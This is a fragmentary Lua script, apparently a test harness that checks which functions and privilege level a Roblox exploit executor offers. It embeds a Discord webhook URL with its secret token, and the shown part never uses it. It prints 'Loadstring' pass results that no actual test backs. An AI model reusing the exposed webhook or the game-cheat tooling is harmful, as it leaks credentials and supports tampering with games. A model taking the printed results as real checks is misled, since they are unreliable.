...
local webhook = "https://discord.com/api/webhooks/1388139861839708261/4VavHdbtTis8GgEDNQ3wMt1oMGkljIBFQ16wZr0imBydCslKDSkKdsQFvVPCF5gnGwFv"
...
print("Testing Loadstring Medium...")
print("Testing Loadstring Complicated...")

print("\n")
print("Loadstring Simple: true")

local identity = (getidentity and getidentity()) or (syn and syn.get_identity and syn.get_identity()) or -1

if identity > 3 then
    print("Loadstring Medium: true")
else
    print("Loadstring Medium: false")
end

if identity > 6 then
    print("Loadstring Complicated: true")
else
    print("Loadstring Complicated: false")
end
...
test("getexecutorname", {}, function()
	...
	assert(type(name) == "string" and #name > 0, "getexecutorname did not return a valid string")
end)

test("whatexecutor", {}, function()
	local name = whatexecutor()
	assert(type(name) == "string" and #name > 0, "whatexecutor did not return a valid string")
end)
